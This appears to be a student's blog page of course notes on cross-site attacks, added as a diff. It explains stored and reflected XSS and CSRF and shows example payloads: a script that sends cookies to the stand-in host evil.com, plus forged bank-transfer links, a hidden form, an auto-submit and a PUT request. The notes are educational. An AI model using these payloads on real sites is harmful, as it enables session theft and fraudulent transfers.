@@ -1,0 +1,936 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="software security,HTTP,XSS,CSRF" />
+
+
+<link rel="canonical" href="http://example.com/course/Cross-Site-attack/">
+
+
+
+  <title>
+Cross-Site attack - Principles of Software Security - 课程笔记 |
+AtoposZz =  = 此处存放一些学习笔记</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Cross-Site attack
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2024-10-30 22:31:43">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-10-30T22:31:43+10:00">2024-10-30</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>11k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>10 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">AtoposZz</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://img.picui.cn/free/2024/10/26/671cf5fd1a28a.jpg"></li>
+          <li class="item" data-background-image="https://img.picui.cn/free/2024/10/18/67123a9382651.png"></li>
+          <li class="item" data-background-image="https://img.picui.cn/free/2024/10/18/67123a94b2174.png"></li>
+          <li class="item" data-background-image="https://img.picui.cn/free/2024/10/18/67123a97b6ba9.jpg"></li>
+          <li class="item" data-background-image="https://img.picui.cn/free/2024/10/26/671cf7643bf1a.jpg"></li>
+          <li class="item" data-background-image="https://img.picui.cn/free/2024/10/26/671cf6029148a.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/course/" itemprop="item" rel="index" title="分类于 课程笔记"><span itemprop="name">课程笔记</span></a>
+<meta itemprop="position" content="1" /></span>
+<i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/course/Principles-of-Software-Security/" itemprop="item" rel="index" title="分类于 Principles of Software Security"><span itemprop="name">Principles of Software Security</span></a>
+<meta itemprop="position" content="2" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://example.com/course/Cross-Site-attack/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="Zz">
+    <meta itemprop="description" content="此处存放一些学习笔记, 🌸">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="Cross-Site Scripting" class="active"><a class="anchor"  href="#Cross-Site Scripting">#</a>Cross-Site Scripting</h1>
+<h2 id="XSS" class="active"><a class="anchor"  href="#XSS">#</a>XSS</h2>
+<ol>
+<li>Cross-Site Scripting (XSS)</li>
+</ol>
+<ul>
+<li>Causes arbitrary code to run in a browser that is connected to a trusted Web site
+<ul>
+<li>May occur when code returns HTML output that makes use of user inputs</li>
+<li>Trick users into clicking a hyperlink from outside the site</li>
+</ul>
+</li>
+<li>Attacks allows:
+<ul>
+<li>Disclosure of user files</li>
+<li>Installation of Trojans</li>
+<li>Redirection to other pages</li>
+<li>Trivial theft of cookies</li>
+</ul>
+</li>
+</ul>
+<ol start="2">
+<li>Basic Problem: Echoing Untrusted User Input<br>
+Classic mistake in a server-side application with URL  <code>http://naive.com/search.php?term=justin+bieber</code> <br>
+PHP at search.php responds with</li>
+</ol>
+<figure class="highlight http"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;title&gt;Search results&lt;/title&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">   You have searched for </span><br><span class="line">   &lt;?php echo $_GET[&#x27;term&#x27;] ?&gt; </span><br><span class="line">   ...  </span><br><span class="line"> &lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<p>在这里， <code>$_GET['term']</code>  的内容直接被嵌入到 HTML 中进行回显。如果  <code>$_GET['term']</code>  包含恶意的 HTML 或 JavaScript 代码，则可能引发跨站脚本攻击 (XSS)。<br>
+3. Dangerous HTML Inputs<br>
+ <code>&lt;script&gt;alert(&quot;Boo!&quot;)&lt;/script&gt;</code> <br>
+ 此代码弹出一个警告对话框，证明 XSS 攻击是可能的。<br>
+ <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> <br>
+ 此代码会打印当前页面的 Cookie 信息，攻击者可能会窃取用户的会话 Cookie，从而劫持会话。<br>
+ <code>&lt;script&gt;document.write(&quot;&lt;br&gt;&quot;)&lt;/script&gt;</code> <br>
+ 此代码会在页面中添加一个  <code>&lt;br&gt;</code>  标签，显示攻击者可以更改网页内容。<br>
+ <code>&lt;script&gt;window.location='http://google.com'&lt;/script&gt;</code> <br>
+ 此代码会将当前网页重定向到另一个页面，使得攻击者可以将用户导向恶意站点<br>
+ 4. Main Types of Cross-Site Scripting Attacks<br>
+1.  Stored (persistent)<br>
+2.  Reflected (non-persistent)</p>
+<h2 id="Stored (Persistent) XSS Attacks" class="active"><a class="anchor"  href="#Stored (Persistent) XSS Attacks">#</a>Stored (Persistent) XSS Attacks</h2>
+<ol>
+<li>Data supplied by an attacker is <strong>permanently stored</strong> on a server and displayed to other users when browsing without being properly sanitised<br>
+If the user input is displayed in the page
+<ul>
+<li>HTML tags can mess up the look of the page</li>
+<li>JavaScript can steal information or cause more advanced malicious behaviour</li>
+<li>For the current user or other users<br>
+<img data-src="https://img.picui.cn/free/2024/10/30/67222f628055d.png" alt="img"></li>
+</ul>
+</li>
+</ol>
+<figure class="highlight perl"><figcaption><span>Example Vulnerable Guestbook Program</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!perl</span></span><br><span class="line"> <span class="comment"># Fig. 19.6: fig19_06.pl</span></span><br><span class="line"> <span class="comment"># Guestbook program.</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">use</span> warnings;</span><br><span class="line"> <span class="keyword">use</span> strict;</span><br><span class="line"> <span class="keyword">use</span> CGI <span class="string">qw( :standard )</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">print</span>( header(), start_html( <span class="string">&quot;Guestbook&quot;</span> ), h1( <span class="string">&quot;Guestbook&quot;</span> ));</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> ( param() ) &#123;</span><br><span class="line">    <span class="keyword">print</span> h3( <span class="string">&quot;Thank you for signing our guestbook!!!&quot;</span> ),</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">my</span> <span class="variable">$name</span> = param( <span class="string">&quot;name&quot;</span> );</span><br><span class="line">    <span class="keyword">my</span> <span class="variable">$email</span> = param( <span class="string">&quot;email&quot;</span> );</span><br><span class="line">    <span class="keyword">my</span> <span class="variable">$message</span> = param( <span class="string">&quot;message&quot;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">open</span>( FILE, <span class="string">&quot;&gt;&gt;guestbook.log&quot;</span> ) <span class="keyword">or</span>   //Open the guestbook file</span><br><span class="line">       <span class="keyword">die</span>( <span class="string">&quot;Cannot open guestbook&quot;</span> );</span><br><span class="line">    <span class="keyword">print</span>( FILE, <span class="string">&quot;\n&quot;</span>, hr(), <span class="string">&quot;From: &quot;</span>, </span><br><span class="line">       a( &#123; <span class="string">-href =&gt;</span> <span class="string">&quot;mailto:<span class="variable">$email</span>&quot;</span> &#125;, <span class="variable">$name</span> ), br(), br(),</span><br><span class="line">       <span class="variable">$message</span> );    <span class="regexp">//</span> Store the user entered data in the guestbook file</span><br><span class="line">    <span class="keyword">close</span>( FILE );</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">open</span>( FILE, <span class="string">&quot;guestbook.log&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&quot;Cannot open guestbook&quot;</span> );   <span class="regexp">//</span>Open the guestbook file</span><br><span class="line"></span><br><span class="line"> <span class="keyword">print</span> <span class="keyword">while</span> ( &lt;FILE&gt; );      <span class="regexp">//</span>Display the contents of the guestbook file</span><br><span class="line"> <span class="keyword">close</span>( FILE );</span><br><span class="line"></span><br><span class="line"> <span class="keyword">print</span>( h4( <span class="string">&quot;Please sign our guestbook:&quot;</span> ), start_form(),</span><br><span class="line"></span><br><span class="line">     <span class="string">&quot;Name: &quot;</span>, textfield( <span class="string">-name =&gt;</span> <span class="string">&quot;name&quot;</span> ), br(),</span><br><span class="line">     <span class="string">&quot;E-mail: &quot;</span>, textfield( <span class="string">-name =&gt;</span> <span class="string">&quot;email&quot;</span> ), br(),</span><br><span class="line">     <span class="string">&quot;Enter your message:&quot;</span>, br(),</span><br><span class="line">     textarea( <span class="string">-name =&gt;</span> <span class="string">&quot;message&quot;</span>, <span class="string">-rows =&gt;</span> <span class="number">5</span>, <span class="string">-columns =&gt;</span> <span class="number">50</span>, <span class="string">-wrap =&gt;</span> <span class="number">1</span> ),</span><br><span class="line">     br(), submit( <span class="string">-name =&gt;</span> <span class="string">&quot;Sign the Guestbook&quot;</span> ), end_form(),</span><br><span class="line"></span><br><span class="line">     end_html() );</span><br></pre></td></tr></table></figure>
+<p>该 Perl 脚本是一个基本的访客留言簿程序，允许用户输入姓名、电子邮件和消息并将其保存到日志文件 (guestbook.log) 中。程序还可以读取并显示日志文件的内容</p>
+<ul>
+<li>用户输入未过滤：程序直接使用用户输入来生成 HTML 输出和写入日志文件，没有进行任何过滤或转义，容易导致跨站脚本攻击（XSS）。
+<ul>
+<li>例如，用户在  <code>name</code>  或  <code>message</code>  输入字段中插入  <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> ，这段恶意代码将会在其他用户查看留言簿时被执行。</li>
+<li>或是在留言时插入 HTML 改变页面布局</li>
+</ul>
+</li>
+<li>日志文件的可写性：<br>
+程序将用户的输入附加到日志文件 guestbook.log，但没有验证文件是否存在或是否已被修改，可能会导致文件篡改或覆盖攻击。<br>
+<img data-src="https://img.picui.cn/free/2024/10/30/6722340e28890.png" alt="img"></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><img data-src="https://img.picui.cn/free/2024/10/30/6722340ddbbb1.png" alt="Image 1"></th>
+<th style="text-align:center"><img data-src="https://img.picui.cn/free/2024/10/30/6722340b9e2cd.png" alt="Image 2"></th>
+</tr>
+</thead>
+</table>
+<h2 id="Reflected (Non-Persistent) XSS Attacks" class="active"><a class="anchor"  href="#Reflected (Non-Persistent) XSS Attacks">#</a>Reflected (Non-Persistent) XSS Attacks</h2>
+<ol>
+<li>Data supplied by an attacker is displayed in the response page <strong>without being stored on a server</strong><br>
+If the user input is displayed in the page
+<ul>
+<li>HTML tags can mess up the look of the page</li>
+<li>JavaScript can steal information or cause more advanced malicious behaviour</li>
+<li>For only the current user</li>
+</ul>
+</li>
+<li>Example<br>
+<img data-src="https://img.picui.cn/free/2024/10/30/672236eb773d1.png" alt="img"></li>
+</ol>
+<ul>
+<li>恶意网页（<span class="exturl" data-url="aHR0cDovL2V2aWwuY29t">evil.com</span>）<br>
+攻击者在  <code>evil.com</code>  上创建了一个包含恶意代码的网页。<br>
+页面中包含了一个指向目标网站的链接或表单，其中含有恶意的 JavaScript 代码。例如：</li>
+</ul>
+<figure class="highlight html"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://naive.com/hello.cgi?name=&lt;script&gt;win.open(&#x27;http://evil.com/steal.cgi?cookie=&#x27; + document.cookie)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>链接中的  <code>name</code>  参数是用来注入 JavaScript 代码的。代码试图将用户的  <code>cookie</code>  信息发送到攻击者的服务器（即  <code>evil.com</code>  的  <code>steal.cgi</code>  脚本）。</p>
+<ul>
+<li>受害者点击了恶意链接并访问了目标网页。<br>
+浏览器向 <span class="exturl" data-url="aHR0cDovL25haXZlLmNvbQ==">naive.com</span> 发送请求，其中包含了恶意的 name 参数。请求的样式为：</li>
+</ul>
+<figure class="highlight javascript"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /hello.<span class="property">cgi</span>?name=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">win.<span class="title function_">open</span>(<span class="string">&#x27;http://evil.com/steal.cgi?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>目标网站（<span class="exturl" data-url="aHR0cDovL25haXZlLmNvbQ==">naive.com</span>）<br>
+目标网站 <span class="exturl" data-url="aHR0cDovL25haXZlLmNvbQ==">naive.com</span> 将用户输入的 name 参数原封不动地嵌入到了响应的 HTML 页面中。响应页面可能是这样：</li>
+</ul>
+<figure class="highlight html"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span>Hello, dear </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">win.<span class="title function_">open</span>(<span class="string">&#x27;http://evil.com/steal.cgi?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>. Welcome!<span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>由于未对输入进行过滤，浏览器将  <code>script</code>  标签作为普通的 JavaScript 代码执行。</p>
+<ul>
+<li>结果<br>
+浏览器执行了恶意 JavaScript 代码，打开了一个新的窗口并向  <code>evil.com/steal.cgi</code>  发送了用户的  <code>cookie</code>  信息。<br>
+攻击者通过这种方式获取了受害者的敏感信息（例如身份验证 cookie），并可能进一步进行会话劫持。<br>
+违反同源策略（SOP）：同源策略（Same-Origin Policy）旨在保护用户的浏览器不被恶意脚本跨站攻击，XSS 攻击直接违反了这一策略</li>
+</ul>
+<ol start="3">
+<li>Reflected XSS Attack Details</li>
+</ol>
+<ul>
+<li>User is tricked into visiting an honest website</li>
+<li>Bug in website code causes user’s browser to execute an arbitrary attack script
+<ul>
+<li>The origin of this script is now the website itself</li>
+</ul>
+</li>
+<li>Script can request sensitive data, control form fields on this page and linked pages
+<ul>
+<li>Can cause user’s browser to attack other websites<br>
+Example: <span class="exturl" data-url="aHR0cDovL015U3BhY2UuY29t">MySpace.com</span> phishing attack injects a fake password field that sends password to attacker</li>
+</ul>
+</li>
+</ul>
+<h2 id="Stored XSS VS Reflected XSS" class="active"><a class="anchor"  href="#Stored XSS VS Reflected XSS">#</a>Stored XSS VS Reflected XSS</h2>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>存储型 XSS (Stored XSS)</th>
+<th>反射型 XSS (Reflected XSS)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>代码存储</td>
+<td>服务器端持久存储</td>
+<td>仅在请求中反射</td>
+</tr>
+<tr>
+<td>持久性</td>
+<td>持久性，影响更多用户</td>
+<td>非持久性，通常只影响特定用户</td>
+</tr>
+<tr>
+<td>攻击手段</td>
+<td>利用持久存储（如数据库、日志、文件等）</td>
+<td>通过恶意链接或表单提交诱导用户</td>
+</tr>
+<tr>
+<td>示例场景</td>
+<td>评论区、论坛帖子、博客文章、用户简介等</td>
+<td>钓鱼邮件、恶意链接、搜索查询等</td>
+</tr>
+<tr>
+<td>修复难度</td>
+<td>难度较大，需清理服务器上的恶意代码</td>
+<td>难度较小，可通过输入验证和转义快速修复</td>
+</tr>
+</tbody>
+</table>
+<h2 id="Preventing XSS Attacks" class="active"><a class="anchor"  href="#Preventing XSS Attacks">#</a>Preventing XSS Attacks</h2>
+<ol>
+<li>Input Filtering<br>
+ 还没懂先放个链接在这<span class="exturl" data-url="aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9YU1NfRmlsdGVyX0V2YXNpb25fQ2hlYXRfU2hlZXQuaHRtbA=="> XSS Filter Evasion Cheat Sheet</span></li>
+<li>Framework validation</li>
+<li>Output Sanitisation</li>
+</ol>
+<ul>
+<li>Any user input and client-side data must be preprocessed before it is used inside HTML
+<ul>
+<li>PHP:  <code>htmlspecialchars(string)</code>  replaces all special characters with their HTML code 例如，将  <code>&lt;</code>  转换为  <code>&amp;lt;</code> ， <code>&gt;</code>  转换为  <code>&amp;gt;</code> ，以防止这些字符被浏览器解释为 HTML 或脚本标签。</li>
+<li><span class="exturl" data-url="aHR0cDovL0FTUC5ORVQ=">ASP.NET</span>:  <code>Server.HtmlEncode(string)</code>  该方法会将字符串中的特殊字符转换为 HTML 实体，确保浏览器不会将其解释为可执行代码。</li>
+</ul>
+</li>
+<li>过滤可能会将输入转换成攻击形式
+<ul>
+<li>如果预处理过程中未彻底消除所有潜在威胁，有可能仍会导致 XSS 等攻击。</li>
+<li>需要在过滤后多次循环检查，并在检测到恶意内容时重新应用过滤，直到不再发现潜在威胁为止。</li>
+</ul>
+</li>
+</ul>
+<h1 id="Cross-Site Request Forgery" class="active"><a class="anchor"  href="#Cross-Site Request Forgery">#</a>Cross-Site Request Forgery</h1>
+<h2 id="CSRF" class="active"><a class="anchor"  href="#CSRF">#</a>CSRF</h2>
+<ol>
+<li>Cross-Site Request Forgery (CSRF)</li>
+</ol>
+<ul>
+<li>A privileged user is tricked to perform an operation on the behalf of an attacker
+<ul>
+<li>Often through social engineering (such as sending a link via email or chat)</li>
+</ul>
+</li>
+<li>Usually unnoticed by the victim user
+<ul>
+<li>Requests are sent by the browser behind the scenes</li>
+</ul>
+</li>
+<li>CSRF exploits the trust that a web site has in a user’s browser
+<ul>
+<li>XSS exploits the trust a user has for a particular site</li>
+</ul>
+</li>
+</ul>
+<ol start="2">
+<li>Characteristics of CSRF</li>
+</ol>
+<ul>
+<li>Web sites rely on a user’s identity</li>
+<li>The site has trust in that identity</li>
+<li>The user’s browser is tricked into sending HTTP requests to a target site</li>
+<li>Such HTTP requests have side effects
+<ul>
+<li>Because the attacker doesn’t receive the response</li>
+</ul>
+</li>
+</ul>
+<h2 id="Example" class="active"><a class="anchor"  href="#Example">#</a>Example</h2>
+Example Description：
+Alice wishes to transfer $100 to Bob using the bank.com web application that is vulnerable to CSRF. Charlie, an attacker, wants to trick Alice into sending the money to Charlie instead. The attack will comprise the following steps: 
+<ul>
+<li>Build an exploit URL or script</li>
+<li>Trick Alice into executing the action with social engineering</li>
+</ul>
+<ol>
+<li>Example: GET<br>
+A GET request from Alice to transfer money to Bob</li>
+</ol>
+<figure class="highlight ruby"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> <span class="symbol">http:</span>/<span class="regexp">/bank.com/transfer</span>.<span class="keyword">do</span>?acct=<span class="variable constant_">BOB</span>&amp;amount=<span class="number">100</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>
+<p>Charlie first forges the following exploit URL</p>
+<figure class="highlight ruby"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/bank.com/transfer</span>.<span class="keyword">do</span>?acct=<span class="variable constant_">CHARLIE</span>&amp;amount=<span class="number">100000</span></span><br></pre></td></tr></table></figure>
+<p>Then, Charlie tricks Alice into loading this URL <strong>when Alice is logged into the bank</strong> 例如通过发送恶意电子邮件或在其他网站上种植恶意链接。</p>
+<figure class="highlight html"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amount=100000&quot;</span>&gt;</span>查看我的图片！<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight html"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amount=100000&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>Example: POST<br>
+A POST request from Alice to transfer money to Bob</li>
+</ol>
+<figure class="highlight http"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://bank.com/transfer.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"> acct=BOB&amp;amount=100</span><br></pre></td></tr></table></figure>
+<p>Charlie first crafts some hidden FORM tags</p>
+<figure class="highlight html"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://bank.com/transfer.do&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;acct&quot;</span> <span class="attr">value</span>=<span class="string">&quot;CHARLIE&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;100000&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;查看我的图片！&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Then, Charlie tricks Alice to click on the submit button<br>
+Can also be executed automatically using JavaScript</p>
+<figure class="highlight html"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>Example: Other HTTP Methods<br>
+Charlie can use HTTP PUT method that takes a JSON object as an argument</li>
+</ol>
+<figure class="highlight http"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">http://bank.com/transfer.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"> &#123;</span><br><span class="line">   &quot;acct&quot;: &quot;CHARLIE&quot;,</span><br><span class="line">   &quot;amount&quot;: 100000</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>Such requests can be executed with JavaScript</p>
+<figure class="highlight html"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">put</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> x = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">open</span>(<span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;http://bank.com/transfer.do&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="string">&quot;acct&quot;</span>: <span class="string">&quot;CHARLIE&quot;</span>, <span class="string">&quot;amount&quot;</span>: <span class="number">100000</span>&#125;));</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span 